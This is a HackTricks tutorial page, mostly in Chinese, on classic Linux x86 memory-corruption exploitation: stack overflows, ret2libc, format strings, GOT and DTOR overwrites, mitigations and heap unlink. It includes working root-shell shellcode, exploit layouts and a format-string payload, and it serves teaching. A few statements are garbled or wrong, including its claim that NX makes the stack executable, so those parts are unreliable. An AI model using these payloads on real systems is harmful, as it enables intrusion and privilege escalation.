# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault: When trying to access a memory address that has not been assigned to the process.

To obtain the address of a function within a program, you can:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### 调用 sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

查看内核中断：cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; 清空 eax\
xor ebx, ebx ; ebx = 0，因为没有参数要传递\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; 执行 syscall

**nasm -f elf assembly.asm** —> 返回一个 .o 文件\
**ld assembly.o -o shellcodeout** —> 生成一个包含汇编代码的可执行文件，可以用 **objdump** 提取 opcodes\
**objdump -d -Mintel ./shellcodeout** —> 确认这确实是我们的 shellcode 并提取 OpCodes

**验证 shellcode 是否有效**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
为了确保系统调用被正确执行，应编译前一个程序并在**strace ./COMPILADO_程序**中查看系统调用。

在创建shellcode时，可以使用一个技巧。第一条指令是跳转到一个调用。该调用会调用原始代码，并将EIP放入堆栈。在call指令之后，我们已经放入了所需的字符串，因此可以使用该EIP指向字符串，并继续执行代码。

EJ **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**使用堆栈(/bin/sh)的基本ESP：**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV是一个简单的exploit，利用了Linux x86系统中的一个栈溢出漏洞。exploit的主要目的是通过修改EIP寄存器的值来控制程序的执行流程。exploit的payload会将一个精心构造的shellcode注入到程序的内存中，然后利用栈溢出漏洞执行这段shellcode。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

这是一小段代码，用于遍历与进程关联的内存页面，以查找其中存储的 shellcode（查找 shellcode 中的某个签名）。在只有少量空间用于注入代码的情况下非常有用。

**多态 Shellcodes**

这些是加密的 shell，其中包含一小段代码用于解密并跳转到它，使用 Call-Pop 技巧，这是一个**凯撒加密的示例**：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **攻击帧指针（EBP）**

在我们可以修改EBP但无法修改EIP的情况下很有用。

已知在退出函数时会执行以下汇编代码：
```
movl               %ebp, %esp
popl                %ebp
ret
```
以这种方式，可以在退出被另一个函数调用的函数（fvuln）时修改EBP，当调用fvuln的函数结束时，其EIP可以被修改。

在fvuln中，可以输入一个指向shellcode地址+4的虚假EBP（需要加4是因为pop）。因此，在函数退出时，将在ESP中放入&(\&Shellcode)+4的值，通过pop将ESP减去4，这将指向shellcode的地址，当执行ret时。

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
只允许修改EBP的最不显著字节。可以执行类似上述的攻击，但存储shellcode地址的内存必须与EBP共享前3个字节。

## **4. Return to Libc方法**

当堆栈不可执行或留下很小的缓冲区以进行修改时，这种方法很有用。

ASLR导致每次执行时函数加载到内存的不同位置。因此，在这种情况下，此方法可能不起作用。对于远程服务器，由于程序在同一地址上持续执行，因此可能会有用。

* **cdecl(C声明)** 将参数放入堆栈，并在退出函数后清除堆栈
* **stdcall(标准调用)** 将参数放入堆栈，由被调用函数清除堆栈
* **fastcall** 将前两个参数放入寄存器，其余参数放入堆栈

将libc的system指令的地址放入，并将字符串“/bin/sh”作为参数传递，通常从环境变量中传递。此外，使用exit函数的地址，以便在不再需要shell时退出程序而不会出现问题（并写入日志）。

**export SHELL=/bin/sh**

要找到所需的地址，可以在**GDB**中查看：\
**p system**\
**p exit**\
**rabin2 -i 可执行文件** —> 给出程序加载时使用的所有函数的地址\
（在start或某个断点内）：**x/500s $esp** —> 在这里搜索字符串/bin/sh

一旦获得这些地址，**exploit**如下：

“A” \* EBP距离 + 4（EBP：最好是4个“A”，以避免段错误） + **system**地址（将覆盖EIP） + **exit**地址（从system(“/bin/sh”)退出后将调用此函数，因为堆栈的前4个字节被视为要执行的下一个EIP地址） + “**/bin/sh**”地址（将作为system的参数传递）

这样，EIP将被system地址覆盖，system将以字符串“/bin/sh”作为参数接收，并在退出后执行exit()函数。

可能会遇到某个函数地址的某个字节为null或空格（\x20）的情况。在这种情况下，可以反汇编前面的地址，因为可能有多个NOP，这样可以调用其中一个而不是直接调用函数（例如使用 > x/8i system-4）。

这种方法有效，因为使用**ret**而不是**call**调用system函数时，函数会认为前4个字节将是要返回的**EIP**地址。

使用此方法的一个有趣技术是调用**strncpy()**将payload从堆栈移动到堆，然后使用**gets()**执行该payload。

另一个有趣的技术是使用**mprotect()**，它允许为内存的任何部分分配所需的权限。它适用于BDS、MacOS和OpenBSD，但不适用于Linux（控制不允许同时授予写入和执行权限）。使用此攻击可以将堆栈重新配置为可执行。

**函数链接**

基于前述技术，这种利用方式包括：\
填充 + \&Function1 + \&pop;ret; + \&arg\_fun1 + \&Function2 + \&pop;ret; + \&arg\_fun2 + …

这样可以链接要调用的函数。此外，如果要使用具有多个参数的函数，可以放置所需的参数（例如4个）并放置4个参数，然后查找包含opcodes的地址：pop, pop, pop, pop, ret —> **objdump -d 可执行文件**

**通过伪造帧进行链接（EBP链接）**

利用可以操纵EBP的能力，通过EBP和"leave;ret"来链接多个函数的执行。

填充

* 在EBP中放置一个指向的虚假EBP：第二个虚假EBP + 要执行的函数：(\&system() + \&leave;ret + &“/bin/sh”)
* 在EIP中放置一个指向**leave;ret**的地址

启动shellcode，指向shellcode的下一部分，例如：第二个EBP + \&system() + &(leave;ret;) + &”/bin/sh”

第二个EBP将是：第三个虚假EBP + \&system() + &(leave;ret;) + &”/bin/ls”

可以在可以访问的内存部分中无限重复此shellcode，从而将shellcode轻松地分割为小块内存。

（通过EBP和ret2lib之前看到的漏洞混合执行函数）

## **5. 附加方法**

**Ret2Ret**

当无法将堆栈地址放入EIP（检查EIP不包含0xbf）或无法计算shellcode位置时很有用。但是，易受攻击的函数接受一个参数（shellcode将在此处）。

因此，通过将EIP更改为**ret**地址，将加载下一个地址（即函数的第一个参数的地址）。也就是说，将加载shellcode。

Exploit如下：SHELLCODE + 填充（直到EIP） + **\&ret**（堆栈的下几个字节指向shellcode的开头，因为将参数传递给堆栈中的地址）

似乎像**strncpy**这样的函数在完成后会从堆栈中删除存储shellcode的地址，从而使此技术无效。也就是说，传递给函数的参数地址（存储shellcode的地址）被0x00修改，因此在第二个**ret**调用时会遇到0x00，程序将终止。
```
**Ret2PopRet**
```
如果我们无法控制第一个参数，但可以控制第二个或第三个参数，我们可以用指向pop-ret或pop-pop-ret的地址来覆盖EIP，取决于我们需要的情况。

**Murat技术**

在Linux中，所有程序都映射到0xbfffffff开始。

通过观察Linux中新进程堆栈的构建方式，可以开发一种利用方式，使程序在仅有shellcode作为变量的环境中启动。因此，可以计算出shellcode所在的地址：addr = 0xbfffffff - 4 - strlen(完整可执行文件名称) - strlen(shellcode)

这样就可以轻松地获取包含shellcode的环境变量的地址。

这是因为execle函数允许创建仅包含所需环境变量的环境。

**跳转到ESP：Windows风格**

由于ESP始终指向堆栈的开头，这种技术涉及用**jmp esp**或**call esp**的地址替换EIP。这样，在覆盖EIP后保存shellcode，因为在执行**ret**后，ESP将指向下一个地址，即shellcode所在的地址。

如果Windows或Linux未启用ASLR，则可以调用存储在共享对象中的**jmp esp**或**call esp**。如果启用了ASLR，则可以在受影响的程序内部搜索。

此外，将shellcode放在EIP损坏后而不是堆栈中间，使得在函数执行过程中执行的push或pop指令不会触及shellcode（如果放在函数堆栈中间可能会发生）。

类似于这种情况，如果我们知道函数返回存储shellcode的地址，可以调用**call eax**或**jmp eax (ret2eax)**。

**整数溢出**

当变量无法处理传递给它的如此大的数字时，就会发生这种类型的溢出，可能是由于有符号和无符号变量之间的混淆，例如：
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
在上面的示例中，我们可以看到该程序期望有2个参数。第一个是下一个字符串的长度，第二个是字符串本身。

如果我们将负数作为第一个参数传递，将会得到一个 len < 256 的结果，我们会通过这个过滤器，并且 strlen(buffer) 也会小于 l，因为 l 是无符号整数，会非常大。

这种溢出不是为了在程序进程中写入内容，而是为了绕过设计不良的过滤器以利用其他漏洞。

**未初始化的变量**

未初始化的变量可能会取得任意值，观察这一点可能会很有趣。它可能会取决于前一个函数中某个变量的值，而这个变量可能会受到攻击者的控制。

## **格式化字符串**

在 C 语言中，**`printf`** 是一个用于**打印**字符串的函数。该函数期望的**第一个参数**是**带有格式化符号的原始文本**。接下来期望的参数是**用于替换**原始文本中**格式化符号的值**。

当**攻击者的文本被放置为该函数的第一个参数**时，就会出现漏洞。攻击者可以利用**printf格式化字符串的能力**来**编写特殊输入**，从而**在任何地址写入任何数据**。通过这种方式，可以**执行任意代码**。

格式化符号:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **写入**的是**写入的字节数**在**指定地址**。写入**与**我们需要**写入的十六进制数**一样多的字节**是您可以**写入任何数据**的方法。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT（全局偏移表）/ PLT（过程链接表）

这个表包含程序使用的外部函数的地址。

使用以下命令获取该表的地址：`objdump -s -j .got ./exec`

观察在 GEF 中加载可执行文件后，可以看到在 GOT 中的函数：`gef➤ x/20x 0xDIR_GOT`

使用 GEF 可以开始调试会话并执行 `got` 命令查看 got 表：

在二进制文件中，GOT 包含函数的地址或将加载函数地址的 PLT 部分的地址。此漏洞利用的目标是覆盖稍后将执行的函数的 GOT 条目，使用 `system` 函数的 PLT 地址覆盖。理想情况下，您将覆盖将由您控制参数的函数的 GOT，以便控制发送到系统函数的参数。

如果脚本未使用 `system`，系统函数将不会在 GOT 中有条目。在这种情况下，您需要首先泄漏 `system` 函数的地址。

过程链接表是 ELF 文件中的只读表，存储所有需要解析的必要符号。当调用这些函数之一时，GOT 将重定向流到 PLT，以便解析函数的地址并将其写入 GOT。然后，下次调用该地址时，函数将直接调用，无需解析。

您可以使用 `objdump -j .plt -d ./vuln_binary` 查看 PLT 地址。

### 漏洞利用流程

如前所述，目标是覆盖稍后将调用的函数在 GOT 表中的地址。理想情况下，我们可以将地址设置为位于可执行部分的 shellcode，但很可能您无法在可执行部分编写 shellcode。因此，另一种选择是覆盖一个从用户接收其参数的函数，并将其指向 `system` 函数。

通常，编写地址需要两个步骤：首先写入地址的 2 字节，然后写入另外 2 字节。为此，使用 `$hn`。

HOB 用于地址的 2 个高字节\
LOB 用于地址的 2 个低字节

因此，由于格式字符串的工作方式，您需要首先写入 \[HOB，LOB\] 中较小的一个，然后再写入另一个。

如果 HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

如果 HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 NºParam_dir_HOB LOB_shell-HOB_shell NºParam_dir_LOB

`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'`

### 格式字符串漏洞利用模板

您可以在此处找到使用格式字符串漏洞利用 GOT 的模板：

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

本质上，这是一个在程序完成之前将被调用的函数结构。如果您可以通过跳转到一个地址调用您的 shellcode，或者在需要再次返回到主函数以第二次利用格式字符串的情况下，这将非常有趣。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
请注意，这不会创建一个永久循环，因为当你回到主函数时，canary会注意到，栈的末尾可能已经被破坏，函数不会再次被调用。因此，通过这种方法，你将能够多执行一次漏洞。

### **格式化字符串以转储内容**

格式化字符串也可以被滥用来从程序内存中转储内容。\
例如，在以下情况下，栈中有一个指向标志的本地变量。如果你找到指向标志的指针在内存中的位置，你可以使printf访问该地址并打印标志：

所以，标志在**0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

从泄漏中，你可以看到指向标志的指针在第8个参数中：

![](<../../.gitbook/assets/image (623).png>)

因此，访问第8个参数，你可以获得标志：

![](<../../.gitbook/assets/image (624).png>)

请注意，根据先前的利用并意识到你可以泄漏内容，你可以将指针设置到`printf`加载的可执行部分，并完全转储它！

### **DTOR**

{% hint style="danger" %}
现在很少见到带有dtor部分的二进制文件。
{% endhint %}

析构函数是在程序结束之前执行的函数。\
如果你设法将一个shellcode的地址写入`__DTOR_END__`，那么在程序结束之前将执行它。\
获取此部分的地址：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常你会在值`ffffffff`和`00000000`之间找到**DTOR**部分。所以如果你只看到这些值，意味着**没有任何函数注册**。因此，**覆盖**`00000000`的**地址**为**shellcode**的地址以执行它。

### **格式化字符串到缓冲区溢出**

**sprintf**将格式化字符串**移动到**一个**变量**中。因此，你可以滥用字符串的**格式**来引起**变量**中的**缓冲区溢出**。\
例如，payload `%.44xAAAA`将在变量中**写入44B+"AAAA"**，这可能会导致缓冲区溢出。

### **\_\_atexit 结构**

{% hint style="danger" %}
现在很**奇怪去利用这个**。
{% endhint %}

**`atexit()`**是一个函数，**其他函数作为参数传递给它**。这些**函数**将在执行**`exit()`**或**main**的**返回**时执行。\
如果你可以**修改**其中任何一个**函数**的**地址**指向一个shellcode，你将**控制**这个**进程**，但目前这更加复杂。\
目前要执行的**函数地址**被隐藏在几个结构后面，最终指向的地址不是函数的地址，而是**用XOR加密**和**随机密钥**进行位移。因此，目前这种攻击方式在x86和x64\_86上**不太有用**。\
**加密函数**是**`PTR_MANGLE`**。其他架构如m68k、mips32、mips64、aarch64、arm、hppa...**不实现加密**函数，因为它**返回与输入相同**的内容。因此，这些架构可以通过这种方式受到攻击。

### **setjmp() & longjmp()**

{% hint style="danger" %}
现在很**奇怪去利用这个**。
{% endhint %}

**`Setjmp()`**允许**保存**上下文（寄存器）\
**`longjmp()`**允许**恢复**上下文。\
保存的寄存器有：`EBX, ESI, EDI, ESP, EIP, EBP`\
问题在于EIP和ESP通过**`PTR_MANGLE`**函数传递，因此**易受攻击的架构与上述相同**。\
它们对错误恢复或中断很有用。\
然而，根据我所了解的，其他寄存器没有受到保护，**所以如果在被调用的函数内部有`call ebx`、`call esi`或`call edi`**，就可以接管控制。或者也可以修改EBP以修改ESP。

**VTable和VPTR在C++中**

每个类都有一个**Vtable**，它是一个**指向方法的指针数组**。

每个**类**的对象都有一个**VPtr**，它是**指向其类数组**的指针。VPtr是每个对象头部的一部分，因此如果**覆盖**了**VPtr**，它可以被**修改**为**指向**一个虚拟方法，这样执行函数就会转到shellcode。

## **Preventive Measures and Evasions**

**Return-into-printf**

这是一种将缓冲区溢出转换为格式串错误的技术。它涉及替换EIP以指向函数的printf，并将操纵的格式字符串作为参数传递给它，以获取有关进程状态的值。

**Library Attacks**

库位于具有16位随机性的位置 = 65636个可能的地址。如果一个易受攻击的服务器调用fork()，内存地址空间将在子进程中复制并保持不变。因此，可以尝试对libc的usleep()函数进行暴力破解，将“16”作为参数传递，以便当响应时间超过正常时间时找到该函数。一旦知道该函数的位置，就可以获得delta\_mmap并计算其他内容。

唯一确保ASLR有效的方法是使用64位架构。在那里没有暴力攻击。

### Relro

**Relro（只读重定位）**影响内存权限，类似于NX。不同之处在于，NX使堆栈可执行，而RELRO使**某些内容只读**，因此我们**无法写入**。我见过这成为障碍的最常见方式是阻止我们执行**`got`表覆写**，稍后将介绍。`got`表保存libc函数的地址，以便二进制文件知道这些地址并调用它们。让我们看看带有和不带有relro的二进制文件的`got`表条目的内存权限是什么样子的。

有了relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
没有relro:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
对于**没有启用 relro** 的二进制文件，我们可以看到 `fgets` 的 `got` 表项地址为 `0x404018`。查看内存映射，我们发现它位于 `0x404000` 和 `0x405000` 之间，具有**`rw` 权限**，意味着我们可以读取和写入它。对于**启用 relro** 的二进制文件，我们看到二进制运行时的 `got` 表地址（启用了 pie，因此此地址会更改）为 `0x555555557fd0`。在该二进制文件的内存映射中，它位于 `0x0000555555557000` 和 `0x0000555555558000` 之间，具有内存**权限 `r`**，这意味着我们只能从中读取。

那么如何**绕过**呢？我通常使用的典型绕过方法是不要写入 relro 导致只读的内存区域，并**找到另一种获取代码执行的方式**。

请注意，为了实现这一点，二进制文件在执行之前需要知道函数的地址：

* 惰性绑定：在首次调用函数时搜索函数的地址。因此，在执行期间，GOT 需要具有写权限。
* 立即绑定：函数的地址在执行开始时解决，然后对敏感部分（如 .got、.dtors、.ctors、.dynamic、.jcr）给予只读权限。`` `** ``-z relro`**`y`**`-z now\`\*\*

要检查程序是否使用立即绑定，可以执行以下操作：
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
当二进制文件被加载到内存中并且第一次调用函数时，会跳转到PLT（Procedure Linkage Table），然后跳转（jmp）到GOT并发现该条目尚未解析（包含PLT的下一个地址）。因此，它调用Runtime Linker或rtfd来解析地址并将其保存在GOT中。

当调用函数时，会调用PLT，它包含存储函数地址的GOT的地址，因此将流重定向到那里，从而调用函数。然而，如果这是第一次调用函数，则GOT中包含的是PLT的下一条指令，因此流会继续执行PLT的代码（rtfd），并查找函数的地址，将其保存在GOT中并调用它。

将二进制文件加载到内存中时，编译器告诉它在运行程序时应该加载数据的偏移量。

懒绑定 —> 第一次调用函数时查找函数地址，因此GOT具有写入权限，以便在查找时将其保存在那里，无需再次查找。

立即绑定 —> 加载程序时查找函数地址，并将.sections .got、.dtors、.ctors、.dynamic、.jcr的权限更改为只读。**-z relro** 和 **-z now**

尽管如此，通常程序未使用这些选项，因此这些攻击仍然可能发生。

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** —> 用于检查是否使用了BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 or =2**

尝试识别不安全地从一个地方复制到另一个地方的函数，并将该函数更改为安全函数。

例如：\
char buf\[16];\
strcpy(but, source);

将其识别为不安全，然后将strcpy()更改为\_\_strcpy\_chk()，使用缓冲区大小作为最大要复制的大小。

**=1** 或 **=2** 之间的区别是：

后者不允许**%n**来自具有写入权限的部分。此外，仅当使用前面的参数时，才能使用参数直接访问，也就是说，只有在使用了**%2$d**和**%1$d**之后才能使用**%3$d**。

要显示错误消息，使用argv\[0]，因此如果将其设置为另一个位置的地址（如全局变量），错误消息将显示该变量的内容。第191页

**Libsafe替代**

通过以下方式激活：LD\_PRELOAD=/lib/libsafe.so.2\
或\
“/lib/libsave.so.2” > /etc/ld.so.preload

将对一些不安全函数的调用拦截并替换为安全函数。这不是标准化的。（仅适用于x86，不适用于使用-fomit-frame-pointer编译，不适用于静态编译，不是所有易受攻击的函数都变得安全，LD\_PRELOAD在具有suid权限的二进制文件中无效）。

**ASCII装甲地址空间**

将共享库加载到0x00000000至0x00ffffff，以便始终存在一个字节0x00。然而，这实际上几乎不会阻止任何攻击，尤其是在little endian中。

**ret2plt**

通过ROP调用plt中的strcpy函数，并指向GOT的条目，将要调用的函数（system()）的第一个字节复制过去。然后重复此过程指向GOT+1，并复制system()的第二个字节... 最后调用GOT中保存的地址，即system()。

**Fake EBP**

对于使用EBP作为指向参数的寄存器的函数，通过修改EIP并指向system()，还必须修改EBP，使其指向一个具有任意两个字节的内存区域，然后指向&”/bin/sh”。

**Chroot中的cages**

debootstrap -arch=i386 hardy /home/user —> 在特定子目录下安装基本系统

管理员可以通过执行以下操作来退出这些cages：mkdir foo; chroot foo; cd ..

**代码插桩**

Valgrind —> 检查错误\
Memcheck\
RAD（Return Address Defender）\
Insure++

## **8 堆溢出：基本利用**

**已分配块**

prev\_size |\
size | —Header\
\*mem | 数据

**空闲块**

prev\_size |\
size |\
\*fd | 指向下一个块的指针\
\*bk | 指向上一个块的指针 —Header\
\*mem | 数据

空闲块以双向链接列表（bin）的形式存在，两个空闲块永远不会相邻（它们会合并）。

在“size”中有位用于指示：前一个块是否正在使用中，块是否通过mmap()分配，块是否属于主要的arena。

释放块时，如果相邻块中有任何一个是空闲的，则通过unlink()宏将它们合并，并将最大的新块传递给frontlink()以将其插入到适当的bin中。

unlink(){\
BK = P->bk; —> 新块的BK是之前空闲块的BK\
FD = P->fd; —> 新块的FD是之前空闲块的FD\
FD->bk = BK; —> 下一个块的BK指向新块\
BK->fd = FD; —> 前一个块的FD指向新块\
}

